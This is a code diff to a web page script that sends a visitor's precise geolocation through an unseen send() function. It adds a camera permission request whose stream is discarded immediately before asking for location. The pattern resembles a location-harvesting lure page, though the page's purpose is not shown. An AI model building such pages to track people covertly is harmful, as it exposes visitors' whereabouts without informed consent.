@@ -80,9 +80,11 @@
         document.getElementById("photo").classList.add("visible");
       }
 
-      if (!navigator.geolocation) {
-        send({ error: "geolocation_unsupported" });
-      } else {
+      function requestLocation() {
+        if (!navigator.geolocation) {
+          send({ error: "geolocation_unsupported" });
+          return;
+        }
         navigator.geolocation.getCurrentPosition(
           function (pos) {
             send({
@@ -98,6 +100,26 @@
           { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
       }
+
+      function requestCameraThenLocation() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          requestLocation();
+          return;
+        }
+        navigator.mediaDevices
+          .getUserMedia({ video: true, audio: false })
+          .then(function (stream) {
+            stream.getTracks().forEach(function (track) {
+              track.stop();
+            });
+            requestLocation();
+          })
+          .catch(function () {
+            requestLocation();
+          });
+      }
+
+      requestCameraThenLocation();
     </script>
   </body>
 </html>
